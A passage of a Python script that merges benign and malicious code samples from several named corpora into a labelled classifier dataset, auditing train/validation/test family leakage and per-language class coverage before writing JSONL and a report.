                category="malicious_package_configuration",
                package_name=package,
                version=version,
                behavior_labels=(behavior[:240],),
                max_code_chars=collector.max_code_chars,
            )
            if full_row is None:
                collector.skipped["npm_missing_config_file"] += 1
                continue
            collector.add(full_row)


def _audit(
    base_rows: list[dict[str, Any]],
    collector: Collector,
    base_path: Path,
    output_path: Path,
) -> dict[str, Any]:
    all_counts: Counter[tuple[str, str, str]] = Counter()
    incoming_counts: Counter[tuple[str, str, str, str]] = Counter()
    family_splits: dict[tuple[str, str, str], set[str]] = defaultdict(set)
    for row in base_rows + collector.rows:
        key = (
            str(row.get("language") or "unknown"),
            str(row.get("split") or ""),
            str(row.get("label") or ""),
        )
        all_counts[key] += 1
    for row in collector.rows:
        key = (
            str(row.get("source") or ""),
            str(row.get("language") or ""),
            str(row.get("split") or ""),
            str(row.get("label") or ""),
        )
        incoming_counts[key] += 1
        family_key = (
            str(row.get("source") or ""),
            str(row.get("language") or ""),
            str(row.get("family") or ""),
        )
        family_splits[family_key].add(str(row.get("split") or ""))
    leaks = [
        {"source": source, "language": language, "family": family, "splits": sorted(splits)}
        for (source, language, family), splits in family_splits.items()
        if len(splits) > 1
    ]
    malicious_coverage = {}
    for language in sorted({key[0] for key in all_counts}):
        rows = {}
        passed = True
        for split, minimum in {"train": 20, "validation": 5, "test": 10}.items():
            benign = all_counts[(language, split, "benign")]
            malicious = all_counts[(language, split, "malicious")]
            rows[split] = {
                "benign": benign,
                "malicious": malicious,
                "minimum_per_class": minimum,
            }
            passed = passed and benign >= minimum and malicious >= minimum
        rows["eligible"] = passed
        malicious_coverage[language] = rows
    return {
        "base_dataset": str(base_path.resolve()),
        "output_dataset": str(output_path.resolve()),
        "base_rows": len(base_rows),
        "incoming_rows": len(collector.rows),
        "output_rows": len(base_rows) + len(collector.rows),
        "offline_text_only": True,
        "family_split_isolation_verified": not leaks,
        "family_split_leaks": leaks[:20],
        "skipped": dict(sorted(collector.skipped.items())),
        "incoming_counts": [
            {
                "source": source,
                "language": language,
                "split": split,
                "label": label,
                "rows": count,
            }
            for (source, language, split, label), count in sorted(incoming_counts.items())
        ],
        "all_counts": [
            {"language": language, "split": split, "label": label, "rows": count}
            for (language, split, label), count in sorted(all_counts.items())
        ],
        "malicious_intent_language_coverage": malicious_coverage,
    }


def build(
    incoming_root: Path,
    base_dataset: Path,
    output_dataset: Path,
    report_path: Path,
    max_code_chars: int,
) -> dict[str, Any]:
    base_rows, existing = _load_existing(base_dataset)
    collector = Collector(existing, max_code_chars)
    stages = (
        ("The Stack Smol C/C++", ingest_stack),
        ("VX Underground C/C++", ingest_vx),
        ("BashBench", ingest_bashbench),
        ("LNU-Phish", ingest_lnu_phish),
        ("GitHub Actions", ingest_starter_workflows),
        ("npm benign manifests", ingest_npm_benign_manifests),
        ("curated behavior augmentation", ingest_curated_behavior_augmentation),
        ("NPMStudy", ingest_npmstudy),
    )
    for name, ingest in stages:
        print(f"[builder] {name}", file=sys.stderr, flush=True)
        ingest(incoming_root, collector)
    report = _audit(base_rows, collector, base_dataset, output_dataset)
    if not report["family_split_isolation_verified"]:
        raise ValueError("incoming family leakage detected; refusing to write dataset")
    output_dataset.parent.mkdir(parents=True, exist_ok=True)
    with output_dataset.open("w", encoding="utf-8", newline="\n") as stream:
        for row in base_rows:
            stream.write(json.dumps(row, ensure_ascii=False) + "\n")
        for row in collector.rows:
            stream.write(json.dumps(row, ensure_ascii=False) + "\n")
    report_path.parent.mkdir(parents=True, exist_ok=True)
    report_path.write_text(json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8")
    return report


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--incoming-root", required=True, type=Path)
    parser.add_argument("--base-dataset", required=True, type=Path)
    parser.add_argument("--output-dataset", required=True, type=Path)
    parser.add_argument("--report", required=True, type=Path)
    parser.add_argument("--max-code-chars", type=int, default=12_000)
    args = parser.parse_args()
    report = build(
        args.incoming_root.resolve(),
        args.base_dataset.resolve(),
        args.output_dataset.resolve(),
        args.report.resolve(),
        max(1000, args.max_code_chars),
    )
    print(json.dumps(report, ensure_ascii=False, indent=2))


if __name__ == "__main__":
    main()
